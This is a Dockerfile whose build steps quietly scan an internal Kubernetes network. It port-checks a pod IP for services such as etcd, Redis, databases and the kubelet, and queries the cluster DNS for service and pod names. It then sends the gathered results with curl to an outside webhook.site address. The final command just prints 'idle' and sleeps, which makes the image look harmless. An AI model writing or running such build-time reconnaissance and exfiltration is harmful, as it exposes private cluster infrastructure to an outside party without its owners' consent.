FROM alpine
RUN apk add --no-cache curl bind-tools netcat-openbsd >/dev/null 2>&1; true
RUN echo "=TGT_142_86_PORTS=" > /o; for p in 22 80 443 8080 2379 6379 5432 3306 9000 10250 6443 8443; do timeout 2 nc -zv 10.244.142.86 $p >>/o 2>&1; done; true
RUN echo "=PTR_SVC=" >>/o; for i in 1 10; do nslookup 10.96.0.$i 10.96.0.10 >>/o 2>&1; done; true
RUN echo "=PTR_POD_SAMPLE=" >>/o; for i in 1 50 142; do nslookup 10.244.$i.1 10.96.0.10 >>/o 2>&1; done; true
RUN echo "=SRV_ANY=" >>/o; nslookup -type=srv _https._tcp.kubernetes.default.svc.cluster.local 10.96.0.10 >>/o 2>&1; true
RUN echo "=SEND=" >>/o; curl -s -m12 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon4"; true
CMD ["sh","-c","echo idle; sleep 3600"]
